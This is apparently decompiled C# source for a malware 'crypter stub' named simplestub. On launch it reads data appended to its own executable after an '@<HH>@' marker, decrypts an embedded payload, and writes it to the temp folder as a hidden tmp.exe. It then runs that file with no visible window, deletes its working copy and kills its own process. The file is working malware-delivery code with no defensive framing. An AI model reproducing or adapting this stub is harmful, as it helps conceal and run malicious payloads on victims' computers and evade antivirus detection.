using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using simplestub.My;

namespace simplestub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 266);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		FileSystem.FileCopy(Application.get_ExecutablePath(), ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\File.exe");
		FileSystem.FileOpen(1, ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\file.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		string text = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref text, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		string[] array = Strings.Split(text, "@<HH>@", -1, (CompareMethod)0);
		Process currentProcess = Process.GetCurrentProcess();
		if (Information.UBound((Array)array, 1) < 3)
		{
			string text2 = Encryption.Decrypt(array[2], array[1]);
			FileSystem.FileOpen(1, Interaction.Environ("temp") + "\\tmp.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
			FileSystem.FilePut(1, text2, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			FileSystem.SetAttr(Interaction.Environ("temp") + "\\tmp.exe", (FileAttribute)2);
			Interaction.Shell(Interaction.Environ("temp") + "\\tmp.exe", (AppWinStyle)0, true, -1);
		}
		if (Information.UBound((Array)array, 1) == 3)
		{
			string text2 = Encryption.Decrypt(array[2], array[1]);
			FileSystem.FileOpen(1, Interaction.Environ("temp") + "\\tmp.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
			FileSystem.FilePut(1, text2 + array[3], -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			FileSystem.SetAttr(Interaction.Environ("temp") + "\\tmp.exe", (FileAttribute)2);
			Interaction.Shell(Interaction.Environ("temp") + "\\tmp.exe", (AppWinStyle)0, true, -1);
		}
		((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\file.exe");
		currentProcess.Kill();
	}
}
